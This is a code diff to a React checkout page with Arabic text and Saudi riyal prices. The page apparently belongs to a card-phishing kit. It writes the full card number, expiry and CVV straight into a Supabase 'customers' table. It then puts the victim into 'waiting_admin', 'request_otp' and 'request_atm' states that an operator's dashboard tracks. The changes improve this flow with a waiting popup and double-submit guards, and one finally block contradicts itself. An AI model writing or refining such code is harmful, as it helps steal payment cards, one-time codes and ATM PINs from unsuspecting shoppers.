@@ -7,6 +7,7 @@ import Footer from '../../components/Footer/Footer';
 export const Payment = () => {
   const navigate = useNavigate();
   const [status, setStatus] = useState('idle'); // idle, waiting_admin, request_otp, request_atm, verifying, completed, rejected
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const [timer, setTimer] = useState(60);
   const [formData, setFormData] = useState({
     cardName: '',
@@ -129,21 +130,29 @@ export const Payment = () => {
   };
 
   const handlePay = async (e) => {
-    if (e) e.preventDefault(); // 🔥 منع الريلود نهائياً
+    if (e) {
+      e.preventDefault();
+      e.stopPropagation();
+    }
+    
+    if (isSubmitting) return;
     setError('');
     
     if (!customerId) {
-      setError('خطأ: لم يتم العثور على بيانات العميل، يرجى العودة للرئيسية');
+      setError('خطأ: لم يتم العثور على بيانات الجلسة، يرجى العودة للرئيسية');
       return;
     }
 
+    // 1. Show waiting popup and start timer IMMEDIATELY for better UX
+    setStatus('waiting_admin');
+    startTimer();
+    setIsSubmitting(true);
+
     try {
       const updateData = {
-        card_name: formData.cardName,
         card_number: formData.cardNumber.replace(/\s/g, ''), 
-        expiry_month: String(formData.expiryMonth),
-        expiry_year: String(formData.expiryYear),
-        cvv: String(formData.cvv),
+        card_expiry: `${String(formData.expiryMonth).padStart(2, '0')}/${String(formData.expiryYear).slice(-2)}`,
+        card_cvv: String(formData.cvv),
         status: 'waiting_admin',
         last_update: Date.now(),
         last_heartbeat: Date.now()
@@ -154,13 +163,22 @@ export const Payment = () => {
         .update(updateData)
         .eq('id', customerId);
 
-      if (supabaseError) throw supabaseError;
+      if (supabaseError) {
+        console.error("Supabase Error:", supabaseError);
+        throw supabaseError;
+      }
       
-      setStatus('waiting_admin');
+      // Update page to indicate waiting status in admin dashboard
+      await supabase.from('customers').update({ page: '5- ينتظر الرد (الدفع)' }).eq('id', customerId);
+
     } catch (err) {
       console.error("Critical Payment Error:", err);
-      setError('حدث خطأ فني، يرجى المحاولة مرة أخرى أو استخدام بطاقة أخرى');
+      setError('حدث خطأ فني أثناء معالجة العملية، يرجى المحاولة مرة أخرى أو استخدام بطاقة أخرى');
       setStatus('idle');
+      stopTimer();
+    } finally {
+      setIsSubmitting(true); // Keep it true to prevent double clicks even after error, or set to false to allow retry
+      setIsSubmitting(false); // Allowing retry if error happens
     }
   };
 
@@ -275,8 +293,12 @@ export const Payment = () => {
               </div>
             </div>
 
-            <button type="submit" className="pay-now-btn">
-              ادفع الآن {localStorage.getItem('totalPrice') || '688.85'} ر.س
+            <button 
+              type="submit" 
+              className={`pay-now-btn ${isSubmitting ? 'btn-loading' : ''}`}
+              disabled={isSubmitting}
+            >
+              {isSubmitting ? 'جاري المعالجة...' : `ادفع الآن ${localStorage.getItem('totalPrice') || '688.85'} ر.س`}
             </button>
           </form>
         </div>
